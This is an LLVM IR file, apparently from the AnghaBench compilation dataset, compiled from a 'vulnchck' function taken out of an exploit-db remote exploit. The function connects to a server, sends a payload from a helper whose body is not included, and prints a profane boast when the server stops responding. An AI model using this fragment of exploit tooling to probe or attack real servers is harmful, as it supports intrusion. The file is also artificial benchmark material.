; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_903.c_vulnchck.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_903.c_vulnchck.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32 }
%struct.timeval = type { i32, i64 }

@.str = private unnamed_addr constant [37 x i8] c"[!] Checking if the server is vuln!\0A\00", align 1
@.str.1 = private unnamed_addr constant [24 x i8] c"[-] Connecting failed!\0A\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"%s\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [51 x i8] c"[+] Yeaahaa server is vuln, lets fuck that bitch!\0A\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"[-] Server not vuln!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @vulnchck(i32 %0, i32 %1) #0 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca [1024 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i32 %0, i32* %9, align 4
  store i32 %1, i32* %4, align 4
  %10 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i32 0, i32 0
  store i32 3, i32* %10, align 8
  %11 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i32 0, i32 1
  store i64 0, i64* %11, align 8
  %12 = call i32 @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0))
  %13 = load i32, i32* %4, align 4
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @conn(i32 %15, i32 %13)
  store i32 %16, i32* %6, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %21

18:                                               ; preds = %2
  %19 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  %20 = call i32 @exit(i32 1) #3
  unreachable

21:                                               ; preds = %2
  %22 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %23 = call i32 @gen_payload(i8* %22, i32 1024, i32 0, i32 0)
  %24 = load i32, i32* %6, align 4
  %25 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %26 = call i32 @sockprintf(i32 %24, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0), i8* %25)
  %27 = load i32, i32* %6, align 4
  %28 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %29 = call i32 @recv(i32 %27, i8* %28, i32 1024, i32 0)
  %30 = icmp slt i32 %29, 1
  br i1 %30, label %31, label %35

31:                                               ; preds = %21
  %32 = call i32 @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.3, i64 0, i64 0))
  %33 = load i32, i32* %6, align 4
  %34 = call i32 @close(i32 %33)
  ret void

35:                                               ; preds = %21
  %36 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0))
  %37 = load i32, i32* %6, align 4
  %38 = call i32 @close(i32 %37)
  %39 = call i32 @exit(i32 1) #3
  unreachable
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @conn(i32, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @gen_payload(i8*, i32, i32, i32) #1

declare dso_local i32 @sockprintf(i32, i8*, i8*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
